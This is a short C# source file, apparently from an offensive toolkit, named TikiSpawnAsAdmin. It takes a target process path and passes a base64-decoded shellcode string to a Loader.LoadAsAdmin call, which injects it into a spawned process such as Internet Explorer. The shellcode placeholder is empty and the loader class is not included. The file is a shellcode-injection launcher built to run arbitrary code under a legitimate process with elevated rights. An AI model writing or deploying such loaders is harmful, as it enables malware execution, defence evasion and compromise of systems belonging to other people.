using System;

namespace TikiSpawnAsAdmin
{
    class Program
    {
        static void Main(string[] args)
        {
            
            string encodedShellcode = @"";

            if (args.Length != 1)
            {
                Console.WriteLine("Usage: TikiSpawnAsAdmin.exe targetProcess");
                Console.WriteLine("       TikiSpawnAsAdmin.exe \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\"");

                Environment.Exit(1);
            }

            string targetProcess = args[0];

            var ldr = new Loader();

            try
            {
                ldr.LoadAsAdmin(targetProcess, Convert.FromBase64String(encodedShellcode));
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Something went wrong!!" + e.Message);
            }
        }
    }
}
